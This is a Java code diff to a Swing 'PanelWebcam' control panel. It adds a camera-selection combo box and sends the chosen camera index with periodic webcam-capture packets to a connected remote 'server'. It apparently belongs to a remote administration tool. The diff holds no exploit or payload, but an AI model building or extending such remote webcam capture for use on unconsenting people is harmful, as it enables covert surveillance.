@@ -5,13 +5,16 @@ import java.awt.event.ActionEvent;
 import java.awt.event.ActionListener;
 import java.awt.image.BufferedImage;
 import java.io.File;
+import java.util.List;
 
 import javax.imageio.ImageIO;
 import javax.swing.ButtonGroup;
+import javax.swing.DefaultComboBoxModel;
 import javax.swing.GroupLayout;
 import javax.swing.GroupLayout.Alignment;
 import javax.swing.ImageIcon;
 import javax.swing.JButton;
+import javax.swing.JComboBox;
 import javax.swing.JFileChooser;
 import javax.swing.JLabel;
 import javax.swing.JScrollPane;
@@ -37,10 +40,11 @@ public class PanelWebcam extends BaseControlPanel {
 	public ImageIcon icon;
 	public JLabel lbl;
 	public JScrollPane scrollPane;
-	private JLabel lblName;
 	private JToggleButton tglbtnEnable;
 	private JToggleButton tglbtnDisable;
 	private JSpinner spInterval;
+	private JComboBox<String> comboBox;
+	private JLabel lblName;
 
 	public void setDisabled() {
 		
@@ -71,7 +75,7 @@ public class PanelWebcam extends BaseControlPanel {
 						public void run() {
 							try {
 								while (true) {
-									getServer().addToSendQueue(new Packet120Webcam(getServer()));
+									getServer().addToSendQueue(new Packet120Webcam(getServer(), comboBox.getSelectedIndex()));
 									
 									if (!WebcamPlugin.enabled) {
 										return;
@@ -123,39 +127,47 @@ public class PanelWebcam extends BaseControlPanel {
 		JSeparator separator_1 = new JSeparator();
 		separator_1.setOrientation(SwingConstants.VERTICAL);
 		
-		lblName = new JLabel("Unknown");
-		
 		spInterval = new JSpinner();
 		spInterval.setModel(new SpinnerNumberModel(100, 0, 10000, 10));
 		
 		JLabel lblMs = new JLabel("ms");
 		
-		JSeparator separator_2 = new JSeparator();
-		separator_2.setOrientation(SwingConstants.VERTICAL);
+		DefaultComboBoxModel<String> model = new DefaultComboBoxModel<String>();
+		comboBox = new JComboBox<String>(model);
+		
+		List<String> cams = WebcamPlugin.map.get(getServer());
+		
+		for (String s : cams) {
+			model.addElement(s);
+		}
+
+		lblName = new JLabel("...");
 		GroupLayout groupLayout = new GroupLayout(this);
 		groupLayout.setHorizontalGroup(
 			groupLayout.createParallelGroup(Alignment.LEADING)
 				.addComponent(scrollPane, Alignment.TRAILING, GroupLayout.DEFAULT_SIZE, 450, Short.MAX_VALUE)
 				.addGroup(groupLayout.createSequentialGroup()
 					.addContainerGap()
-					.addComponent(tglbtnEnable)
-					.addPreferredGap(ComponentPlacement.RELATED)
-					.addComponent(tglbtnDisable)
-					.addGap(8)
-					.addComponent(separator, GroupLayout.PREFERRED_SIZE, 3, GroupLayout.PREFERRED_SIZE)
-					.addGap(7)
-					.addComponent(btnSave)
-					.addGap(10)
-					.addComponent(separator_1, GroupLayout.PREFERRED_SIZE, 3, GroupLayout.PREFERRED_SIZE)
-					.addPreferredGap(ComponentPlacement.UNRELATED)
-					.addComponent(spInterval, GroupLayout.PREFERRED_SIZE, 60, GroupLayout.PREFERRED_SIZE)
-					.addPreferredGap(ComponentPlacement.RELATED)
-					.addComponent(lblMs)
-					.addGap(7)
-					.addComponent(separator_2, GroupLayout.PREFERRED_SIZE, 3, GroupLayout.PREFERRED_SIZE)
-					.addGap(8)
-					.addComponent(lblName)
-					.addContainerGap(65, Short.MAX_VALUE))
+					.addGroup(groupLayout.createParallelGroup(Alignment.LEADING)
+						.addGroup(groupLayout.createSequentialGroup()
+							.addComponent(tglbtnEnable)
+							.addPreferredGap(ComponentPlacement.RELATED)
+							.addComponent(tglbtnDisable)
+							.addGap(8)
+							.addComponent(separator, GroupLayout.PREFERRED_SIZE, 3, GroupLayout.PREFERRED_SIZE)
+							.addGap(7)
+							.addComponent(btnSave)
+							.addPreferredGap(ComponentPlacement.UNRELATED)
+							.addComponent(separator_1, GroupLayout.PREFERRED_SIZE, 3, GroupLayout.PREFERRED_SIZE)
+							.addPreferredGap(ComponentPlacement.UNRELATED)
+							.addComponent(spInterval, GroupLayout.PREFERRED_SIZE, 60, GroupLayout.PREFERRED_SIZE)
+							.addPreferredGap(ComponentPlacement.RELATED)
+							.addComponent(lblMs))
+						.addGroup(groupLayout.createSequentialGroup()
+							.addComponent(comboBox, GroupLayout.PREFERRED_SIZE, 250, GroupLayout.PREFERRED_SIZE)
+							.addPreferredGap(ComponentPlacement.UNRELATED)
+							.addComponent(lblName)))
+					.addContainerGap(127, Short.MAX_VALUE))
 		);
 		groupLayout.setVerticalGroup(
 			groupLayout.createParallelGroup(Alignment.LEADING)
@@ -169,13 +181,16 @@ public class PanelWebcam extends BaseControlPanel {
 							.addComponent(btnSave))
 						.addComponent(separator, GroupLayout.PREFERRED_SIZE, 22, GroupLayout.PREFERRED_SIZE)
 						.addComponent(separator_1, GroupLayout.PREFERRED_SIZE, 22, GroupLayout.PREFERRED_SIZE)
-						.addGroup(groupLayout.createParallelGroup(Alignment.TRAILING)
-							.addComponent(separator_2, GroupLayout.PREFERRED_SIZE, 22, GroupLayout.PREFERRED_SIZE)
+						.addGroup(groupLayout.createSequentialGroup()
+							.addGap(2)
 							.addGroup(groupLayout.createParallelGroup(Alignment.BASELINE)
 								.addComponent(spInterval, GroupLayout.PREFERRED_SIZE, GroupLayout.DEFAULT_SIZE, GroupLayout.PREFERRED_SIZE)
-								.addComponent(lblMs)
-								.addComponent(lblName))))
-					.addGap(12))
+								.addComponent(lblMs))))
+					.addPreferredGap(ComponentPlacement.RELATED)
+					.addGroup(groupLayout.createParallelGroup(Alignment.BASELINE)
+						.addComponent(comboBox, GroupLayout.PREFERRED_SIZE, GroupLayout.DEFAULT_SIZE, GroupLayout.PREFERRED_SIZE)
+						.addComponent(lblName))
+					.addGap(14))
 		);
 		setLayout(groupLayout);
 
@@ -190,7 +205,7 @@ public class PanelWebcam extends BaseControlPanel {
 		try {
 			WebcamPlugin.enabled = false;
 			Thread.sleep((long) (Integer) spInterval.getValue());
-			getServer().addToSendQueue(new Packet120Webcam(getServer()));
+			getServer().addToSendQueue(new Packet120Webcam(getServer(), comboBox.getSelectedIndex()));
 		} catch (Exception e) {					
 			e.printStackTrace();
 		}	
